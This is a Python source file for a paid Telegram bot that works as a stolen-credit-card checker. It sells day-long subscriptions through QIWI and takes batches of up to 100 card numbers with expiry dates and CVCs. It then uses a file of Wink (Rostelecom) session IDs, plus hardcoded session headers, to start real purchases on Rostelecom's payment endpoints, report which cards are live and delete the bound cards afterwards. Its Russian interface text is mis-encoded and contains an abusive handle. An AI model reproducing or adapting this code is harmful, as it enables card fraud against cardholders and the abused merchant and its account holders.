import logging
import markups as nav
import time
import datetime
import config as cfg
import requests
import random
import asyncio
import re
import queue
import aiohttp
import asyncio
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types.message import ContentTypes
from time import sleep
from queue import Queue
from asyncio import new_event_loop, set_event_loop
from threading import Thread
from random import choice
from db import Database
from pyqiwip2p import QiwiP2P
from dateutil import parser

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
PREFIX = "/,!,?"

bot = Bot(token=cfg.TOKEN)
dp = Dispatcher(bot)

db = Database('database.db')
p2p = QiwiP2P(auth_key=cfg.QIWI_TOKEN)

def days_to_seconds(days):
    return days * 24 * 60 * 60

def time_sub_day(get_time):
    time_now = int(time.time())
    middle_time = int(get_time) - time_now
    
    if middle_time <= 0:
        return False
    else:
        dt = str(datetime.timedelta(seconds=middle_time))
        dt = dt.replace("days", "–¥–Ω–µ–π")
        dt = dt.replace("day", "–¥–µ–Ω—å")
        return dt

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    user_id= str(message.from_user.id)
    user_name= str(message.from_user.username)
    print(f'{user_name}|{user_id} –∑–∞–ø—É—Å—Ç–∏–ª –±–æ—Ç–∞ ')
    if message.chat.type == "private":
        if(not db.user_exists(message.from_user.id)):
            db.add_user(message.from_user.id)
            await bot.send_message(message.from_user.id, "üòé –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ !\n –ü–æ–¥–ø–∏—Å–∫—É –º–æ–∂–Ω–æ –æ—Ñ–æ—Ä–º–∏—Ç—å –ø–æ –∫–Ω–æ–ø–∫–µ!", reply_markup=nav.mainMenu)
        else:
            await bot.send_message(message.from_user.id, "üòé –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ !\n –ü–æ–¥–ø–∏—Å–∫—É –º–æ–∂–Ω–æ –æ—Ñ–æ—Ä–º–∏—Ç—å –ø–æ –∫–Ω–æ–ø–∫–µ!", reply_markup=nav.mainMenu)
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")



@dp.message_handler(lambda message: message.text == "üòº–ü–†–û–§–ò–õ–¨") 
async def without_puree(message: types.Message):
    if message.chat.type == "private":       
        user_sub = time_sub_day(db.get_time_sub(message.from_user.id))
        if user_sub == False:
            user_sub = "‚ùå–û—Ç—Å—É—Ç—Å–≤—É–µ—Ç"
            await bot.send_message(message.from_user.id,
            text=f'''
üÜî ID: <code>{message.from_user.id}</code>
üë± –ò–º—è: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
üåê –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: @{message.from_user.username}
üëÄ –ü–æ–¥–ø–∏—Å–∫–∞: <b>{user_sub}</b>
            ''', parse_mode='HTML', reply_markup=nav.mainMenu
            )
        else:
            await bot.send_message(message.from_user.id,
            text=f'''
üÜî ID: <code>{message.from_user.id}</code>
üë± –ò–º—è: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
üåê –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: @{message.from_user.username}
üëÄ –ü–æ–¥–ø–∏—Å–∫–∞: <b>‚úÖ–ê–∫—Ç–∏–≤–Ω–∞, –±—É–¥–µ—Ç –¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å {user_sub}</b>
            ''', parse_mode='HTML', reply_markup=nav.mainMenu
            )
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å @ZelenskyShluxaYebok")

@dp.message_handler(lambda message: message.text == "‚ù§Ô∏è–ü–û–î–ü–ò–°–ö–ê") 
async def without_puree(message: types.Message):
    if message.chat.type == "private":
        await bot.send_message(message.from_user.id,
        text=f'''
üåö <b>–í–ê–†–ò–ê–ù–¢–´ –ü–û–î–ü–ò–°–ö–ò</b>

ü§®–ü–û–î–ü–ò–°–ö–ê –ù–ê 1 –î–ï–ù–¨
üí∂–¶–ï–ù–ê: 40‚ÇΩ
üìù–°–û–°–¢–ê–í–õ–Ø–Æ–©–ò–ï:
üìÉ–®–õ–Æ–ó <b>WINK</b>
üìÉ–í–†–ï–ú–Ø –ü–û–î–ü–ò–°–ö–ò 1 –î–ï–ù–¨
<b>__________________________________________</b>
‚ù§Ô∏è–î–ª—è –ø–æ–∫—É–ø–∫–∏ –ø–æ–¥–ø–∏—Å–∫–∏ —Å –¥—Ä—É–≥–∏–º–∏ —É—Å–ª–æ–≤–∏—è–º–∏ –ø–∏—Å–∞—Ç—å –≤ –ª–∏—á–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è - <a href="tg://user?id=5100431849">mordoradapter</a>
<b>__________________________________________</b>
‚ö†Ô∏è–î–ï–ù–¨–ì–ò –ó–ê –û–ü–õ–ê–ß–ï–ù–£–Æ –ü–û–î–ü–ò–°–ö–£!!
‚ö†Ô∏è–í–ê–ú –ù–ò–ö–û –ù–ï –í–ï–†–ù–ï–¢!!!
‚ö†Ô∏è–ë–£–î–¢–ï –í–ù–ò–ú–ê–¢–ï–õ–¨–ù–´!!!!
        ''', parse_mode='HTML',reply_markup=nav.submenu
        )
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å @ZelenskyShluxaYebok")

@dp.message_handler(lambda message: message.text == "üí≥–ü–†–û–í–ï–†–ö–ê –°–°") 
async def without_puree(message: types.Message):
    if message.chat.type == "private":
        await bot.send_message(message.from_user.id,
        text=f'''
–î–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Å –≤–≤–µ–¥–∏—Ç–µ
–∫–æ–º–º–∞–Ω–¥—É <b>/cc</b> —Ñ–æ—Ä–º–∞—Ç–∞
<code>/cc 1111111111111111|22|33|444
1111111111111111|22|33|444
1111111111111111|22|33|444
1111111111111111|22|33|444</code>

–§–û–†–ú–ê–¢ –í–í–û–î–ê –î–ê–ù–ù–´–• –ö–ê–†–¢:
1111111111111111 22|33 444
1111111111111111 22/33 444
1111111111111111|22|33|444
        ''', parse_mode='HTML'
        )
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å @ZelenskyShluxaYebok") 


@dp.callback_query_handler(text="subday")
async def subday(call: types.CallbackQuery):
    await bot.delete_message(call.from_user.id, call.message.message_id)
    comment = str(call.from_user.id) + "_40"
    bill = p2p.bill(amount=400, lifetime=15, comment=comment)
    db.add_check(call.from_user.id, bill.bill_id)
    await bot.send_message(call.from_user.id,f"‚úÖ–°—á—ë—Ç –Ω–∞ –æ–ø–ª–∞—Ç—É –≤—ã—Å—Ç–∞–≤–ª–µ–Ω\n\n ‚ö†Ô∏è–í—Ä–µ–º—è –Ω–∞ –æ–ø–ª–∞—Ç—É: 15 –º–∏–Ω—É—Ç\n\n üåê–°—Å—ã–ª–∫–∞ –Ω–∞ –æ–ø–ª–∞—Ç—É: {bill.pay_url}\n\n\n –ù–∏–∫–Ω–µ–π–º –¥–ª—è –æ–ø–ª–∞—Ç—ã: <code>NEGR332288</code>\n ‚úçÔ∏è–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: <code>{comment}</code>\n üí∂–°—É–º–º–∞ –æ–ø–ª–∞—Ç—ã: 400‚ÇΩ\n üèß–ü–ª–∞—Ç–µ–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞: QIWIP2P\n\n<b>__________________________________________</b>\n–ü—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ –ø–æ –Ω–∏–∫–Ω–µ–π–º—É –ø–∏—Å–∞ter",parse_mode='HTML', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))

#@dp.callback_query_handler(text="subweek")
#async def subday(call: types.CallbackQuery):
#    await bot.delete_message(call.from_user.id, call.message.message_id)
#    comment = str(call.from_user.id) + "_1500"
#    bill = p2p.bill(amount=1500, lifetime=15, comment=comment)
#    db.add_check(call.from_user.id, bill.bill_id)
#    await bot.send_message(call.from_user.id,f"‚úÖ–°—á—ë—Ç –Ω–∞ –æ–ø–ª–∞—Ç—É –≤—ã—Å—Ç–∞–≤–ª–µ–Ω\n\n ‚ö†Ô∏è–í—Ä–µ–º—è –Ω–∞ –æ–ø–ª–∞—Ç—É: 15 –º–∏–Ω—É—Ç\n\n üåê–°—Å—ã–ª–∫–∞ –Ω–∞ –æ–ø–ª–∞—Ç—É: {bill.pay_url}\n\n\n –ù–∏–∫–Ω–µ–π–º –¥–ª—è –æ–ø–ª–∞—Ç—ã: <code>PANGL681</code>\n ‚úçÔ∏è–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: <code>{comment}</code>\n üí∂–°—É–º–º–∞ –æ–ø–ª–∞—Ç—ã: 1500‚ÇΩ\n üèß–ü–ª–∞—Ç–µ–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞: QIWIP2P",parse_mode='HTML', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))

#@dp.callback_query_handler(text="submonth")
#async def subday(call: types.CallbackQuery):
#    await bot.delete_message(call.from_user.id, call.message.message_id)
#    comment = str(call.from_user.id) + "_3000"
#    bill = p2p.bill(amount=3000, lifetime=15, comment=comment)
#    db.add_check(call.from_user.id, bill.bill_id)
#    await bot.send_message(call.from_user.id,f"‚úÖ–°—á—ë—Ç –Ω–∞ –æ–ø–ª–∞—Ç—É –≤—ã—Å—Ç–∞–≤–ª–µ–Ω\n\n ‚ö†Ô∏è–í—Ä–µ–º—è –Ω–∞ –æ–ø–ª–∞—Ç—É: 15 –º–∏–Ω—É—Ç\n\n üåê–°—Å—ã–ª–∫–∞ –Ω–∞ –æ–ø–ª–∞—Ç—É: {bill.pay_url}\n\n\n –ù–∏–∫–Ω–µ–π–º –¥–ª—è –æ–ø–ª–∞—Ç—ã: <code>PANGL681</code>\n ‚úçÔ∏è–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: <code>{comment}</code>\n üí∂–°—É–º–º–∞ –æ–ø–ª–∞—Ç—ã: 3000‚ÇΩ\n üèß–ü–ª–∞—Ç–µ–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞: QIWIP2P",parse_mode='HTML', reply_markup=nav.buy_menu(url=bill.pay_url, bill=bill.bill_id))


@dp.callback_query_handler(text_contains="check_")
async def check(callback: types.CallbackQuery):
    bill = str(callback.data[6:])
    info = db.get_check(bill)
    if info != False:
        if str(p2p.check(bill_id=bill).status) == "PAID":
            await bot.delete_message(callback.from_user.id, callback.message.message_id)
            await bot.send_message(callback.from_user.id, "‚úÖ–°—á—ë—Ç —É—Å–ø–µ—à–Ω–æ –æ–ø–ª–∞—á–µ–Ω!")
            time_sub = int(time.time()) + days_to_seconds(1)
            db.set_time_sub(callback.from_user.id, time_sub)
            await bot.send_message(callback.from_user.id, "üòº–í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞!\n –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –æ—Å—Ç–∞–≤—à–µ–µ—Å—è –≤—Ä–µ–º—è –º–æ–∂–Ω–æ –≤ –ø—Ä–æ—Ñ–∏–ª–µ!")
            db.delete_check(bill_id=bill)
        else:
            await bot.delete_message(callback.from_user.id, callback.message.message_id)
            await bot.send_message(callback.from_user.id, "‚ö†Ô∏è–í—ã –Ω–µ –æ–ø–ª–∞—Ç–∏–ª–∏ —Å—á—ë—Ç!", reply_markup=nav.buy_menu(False, bill=bill))
    else:
        await bot.send_message(callback.from_user.id, "‚ùå–°—á—ë—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω!")



async def try_or(fn, df):
    try:
        return await fn()
    except Exception as err:
        print(14)
        print(err)
        return df

headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "589f7086-d3ff-11ec-92bc-341e6b49f6c8:76064354:66507589:2",
    "x-rt-uid": "1650588778788351753",
    "x-rt-san": "1650588778",
}


    
def try_or(fn, df):
    try:
        return fn()
    except Exception as err:
        print(14)
        print(err)
        return df

async def between_callback(card, mm, yy, cvc, queue):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(Gateway1(card, mm, yy, cvc, queue))
    a = queue.get()
    loop.close()
    queue.put(a)


def del_sess(session):
    with open('sess.txt') as f:
        lines = f.readlines()

    str = session
    pattern = re.compile(re.escape(str))
    with open('sess.txt', 'w') as f:
        for line in lines:
            result = pattern.search(line)
            if result is None:
                f.write(line)


def get_sess():
 with open ('sess.txt', 'r') as file:
    lines = file.readlines()
    return random.choice(lines).strip()



headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "589f7086-d3ff-11ec-92bc-341e6b49f6c8:76064354:66507589:2",
    "x-rt-uid": "1650588778788351753",
    "x-rt-san": "1650588778",
}

headers2 = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "Accept": "application/json, text/plain, */*",
    "Referer": "https://wink.rt.ru/",
    "Origin": "https://wink.rt.ru",
}



async def Getcard(sessionacc):
    while True:
        print('Get card')
        try:
            headers = {"User-Agent": "WINK/1.34.1 (Android/11)","session_id": sessionacc,"x-rt-uid": "1650588778788351753","x-rt-san": "1650588778"}
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get("https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards") as r:
                    item = await r.json()
                    print (item)
                    total = item['total_items']
                    data = "items"
                    if item != None:
                        if total > 0:
                            iq = item['items']
                            items = iq[0]['id']
                            print(items)
                            return items
                        if total == 0:
                            return 0
                        else:
                            time.sleep(3)
        except:
            time.sleep(2)



async def deleteCard(cardid):
    print("Delete CardId")
    url = f"https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards/{cardid}"
    params = None
    data = "notification"
    json = None
    ff = lambda: requests.delete(
        url,
        params=params,
        headers=headers,
        json=json,
)
    while True:
        # kk_ = try_or(lambda: ff_(), None)
        # print(kk_)
        kk = try_or(lambda: ff(), None)
        try:
            # print (kk)
            # print(kk.text)
            if data in kk.text:
                # print(kk.json())
                return kk.json()
                sleep(0.1)
                break
            else:
                sleep(0.1)
        except Exception as err:
            print(err)

async def Wink(session):
    json ={
        "price_id":202818819,
        "is_should_link_card":True,
        "service_id":98773779,
        "payment_method_id":1
        }
    json2 ={"events":{"0":[{"event_version":1,"event_counter":22,"timestamp":1652882580999,"san":"99125694453","uid":"HqYGulrxN335QBn2ZoI-3","event_id":"purchase_request","purchase_variant":{"service_id":98773779,"usage_model":"SERVICE","type":"full","price_id":202818819,"currency":"RUB","purchase_cost":29900}}]}}
    headers={"User-Agent": "WINK/1.34.1 (Android/11)","session_id": session,"x-rt-uid": "1650588778788351753","x-rt-san": "1650588778"}
    while True:
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('https://cnt-brsk-itv02.svc.iptv.rt.ru/event_collector',json=json2) as s:
                    a = await s.json(content_type=None)
                    print(a)
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/buy',json=json) as r:
                    dataa = "order_id"
                    data = await r.json(content_type=None)
                    print(data)
                    if dataa in data:
                        return data
                        break
                    else:
                        time.sleep(3)
        except Exception as err:
            logging.error(err, exc_info=True)
            time.sleep(3)



#    async with aiohttp.ClientSession(headers=headers2s,json=json2) as sessionn:
  #      async with sessionn.post('https://securepayments.sberbank.ru:9001/rtk_binding/request') as rr:
  #          json_body2 = await rr.json()
 #           print (json_body2)


async def Wink2(card, mm, yy, cvc, session):
    while True:
        a = await Wink(session)
        print(a)
        data = a
        json = {
			"cardCvc": str(cvc),
			"cardExpMonth": int(mm),
			"cardExpYear": int("20" + yy),
			"cardHolder": "IVAN IVANOV",
			"cardNumber": str(card),
			"confirm": 0,
			"delay": 1,
			"orderId": data['order_id'],
			"payAmount": 29900,
			"payCurrId": "RUB",
			"payTime": "2021-11-28T06:38:43.563+03:00",
			"reqType": "createPayment"
			}
        headers = {"Host": "isespp.pay.rt.ru","User-Agent": "WINK/1.34.1 (Android/11)","Accept": "application/json, text/plain, */*","Referer": "https://wink.rt.ru/","Origin": "https://wink.rt.ru"}
        #url = 'https://securepayments.sberbank.ru:9001/rtk_binding/request'
        url = 'https://isespp.pay.rt.ru/p/1/driver/sdbc'
        if 'order_id' in data:
            async with aiohttp.ClientSession(headers=headers,) as session:
                async with session.post(url,json=json) as r:
                    dataa = "order_id"
                    check = await r.json()
                    print(check)
                    return check
                break
        else:
            time.sleep(3)

async def Gateway1(card, mm, yy, cvc):
    sleep(0.2)
    session = get_sess()
    print(session)
    ccv = f'{card}|{mm}|{yy}|{cvc}'
    if len(yy) == 4:
     yy = yy[-2:]
    bind = await Wink2(card, mm, yy, cvc, session)
    if "reqNote" in bind:
     if bind['reqStatus'] == 101:
      sleep(0.2)
      return(f"""üí∑ {ccv} ‚Äî 299‚ÇΩ""")
     else:
        sleep(0.2)
        return(f"""‚ùå {ccv} ‚Äî 299‚ÇΩ""")    
    else:
        del_sess(session)
        print(f"removed session: {session}")
        return(f"""‚úÖ {ccv} ‚Äî 299‚ÇΩ""")


@dp.message_handler(commands="sub")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id = str(message.text)[5:]
            time_sub = int(time.time()) + days_to_seconds(1)
            db.set_time_sub(user_id, time_sub)
            await message.reply("–ü–æ–¥–ø–∏—Å–∫–∞ –≤—ã–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
            await bot.send_message(user_id, "üòº–í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞!\n –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –æ—Å—Ç–∞–≤—à–µ–µ—Å—è –≤—Ä–µ–º—è –º–æ–∂–Ω–æ –≤  –ø—Ä–æ—Ñ–∏–ª–µ!")
        else:
            await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ü•¥")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")
        
        
@dp.message_handler(commands="sub7")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id = str(message.text)[6:]
            time_sub = int(time.time()) + days_to_seconds(7)
            db.set_time_sub(user_id, time_sub)
            await message.reply("–ü–æ–¥–ø–∏—Å–∫–∞ –≤—ã–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
            await bot.send_message(user_id, "üòº–í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞!\n –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –æ—Å—Ç–∞–≤—à–µ–µ—Å—è –≤—Ä–µ–º—è –º–æ–∂–Ω–æ –≤  –ø—Ä–æ—Ñ–∏–ª–µ!")
        else:
            await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ü•¥")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")


@dp.message_handler(commands="delsub")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id= str(message.text)[8:]
            time_sub = 0
            db.set_time_sub(user_id, time_sub)
            await message.reply("–ü–æ–¥–ø–∏—Å–∫–∞ —É–¥–∞–ª–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
            await bot.send_message(user_id, "üòî–£ –≤–∞—Å —É–±—Ä–∞–ª–∏ –ø–æ–¥–ø–∏—Å–∫—É")
        else:
            await message.reply("–ù–µ—Ç—É –¥–æ—Å—Ç—É–ø–∞ü•¥")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")

@dp.message_handler(commands="sendall")
async def sendall(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            text = message.text[9:]
            users = db.get_users()
            for row in users:
                try:
                    await bot.send_message(row[0], text)
                    if int(row[1]) != 1:
                        db.set_active(row[0], 1)
                except:
                    db.set_active(row[0], 0)
            await bot.send_message(cfg.ADMIN_ID,"–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!")
        else:
            await message.reply("–ù–µ—Ç—É –¥–æ—Å—Ç—É–ø–∞ü•¥")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")

@dp.message_handler(commands="restart")
async def sendall(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            text = message.text[9:]
            users = db.get_users()
            for row in users:
                try:
                    await bot.send_message(row[0], "<code>restart</code>", parse_mode='HTML')
                    if int(row[1]) != 1:
                        db.set_active(row[0], 1)
                except:
                    db.set_active(row[0], 0)
            await bot.send_message(cfg.ADMIN_ID,"–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!",)
        else:
            await message.reply("–ù–µ—Ç—É –¥–æ—Å—Ç—É–ø–∞ü•¥")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")
        
@dp.message_handler(commands="reset")
async def sendall(message: types.Message):
    if message.chat.type == "private":
        if str(message.from_user.id) == cfg.ADMIN_ID:
            user_id= message.text[7:]
            db.set_antispam(user_id, 1)
            await bot.send_message(cfg.ADMIN_ID,"–°–±—Ä–æ—à–µ–Ω–æ!")
        else:
            await message.reply("–ù–µ—Ç—É –¥–æ—Å—Ç—É–ø–∞ü•¥")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")


@dp.message_handler(commands="cc")
async def cc(message: types.Message):
    if message.chat.type == "private":
        if db.get_sub_status(message.from_user.id) == False:
            await message.reply(
                text=f'''
                üòü –î–ª—è —Ä–∞–±–æ—Ç—ã —á–µ–∫–µ—Ä–∞ –∫—É–ø–∏—Ç–µ –ø–æ–¥–ø–∏—Å–∫—É!
                ''', parse_mode='HTML'
                )
        elif db.get_sub_status(message.from_user.id) == True:
            if db.get_antispam(message.from_user.id) == False:
                await message.reply(
                    text=f'''
                    ‚õîÔ∏èü§¨ –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏!
                    ''', parse_mode='HTML'
                    )
            elif db.get_antispam(message.from_user.id) == True:
                cc_list = message.text[4:].split("\n")
                if cc_list == []:
                    await message.reply("–∏—Å–ø–æ–ª—å–∑—É–π —Ç–∞–∫: /chk 1111111111111111|01|23|123")
                    db.set_antispam(message.from_user.id, 1)
                    return
                elif len(cc_list) > 100:
                    await message.reply("–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ 100 cc, –≤—ã –∑–∞–≥—Ä—É–∑–∏–ª–∏ " + str(len(cc_list)))
                    db.set_antispam(message.from_user.id, 1) 
                    return
                else:
                    db.set_antispam(message.from_user.id, 0)
                    z = await message.reply("–ü—Ä–æ–≤–µ—Ä–∫–∞...")
                    m = []
                    for cc in cc_list:
                        fg = cc.replace(' ', '|')
                        fg = fg.replace('/', '|')
                        asd = fg.split("|") 
                        result = await Gateway1(asd[0],asd[1],asd[2],asd[3])
                        if result == "Not":
                            print("‚ùåDEAD")
                        else:               
                            m.append(result)
                            full_data = '\n'.join(m)
                            await z.edit_text(full_data)
                    db.set_antispam(message.from_user.id, 1)
                    await message.answer("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞—Ä—Ç –∑–∞–≤–µ—Ä—à–µ–Ω–∞!‚úÖ")
    elif message.chat.type != "private":
        await message.answer("–ü–æ —á–µ–∫–µ—Ä—É –¥–ª—è –ü–ê–ë–õ–ò–ö —á–∞—Ç–∞ –ø–∏—Å–∞—Ç—å ")



if __name__ == '__main__':
    set_event_loop(new_event_loop())
    executor.start_polling(dp, skip_updates=True)

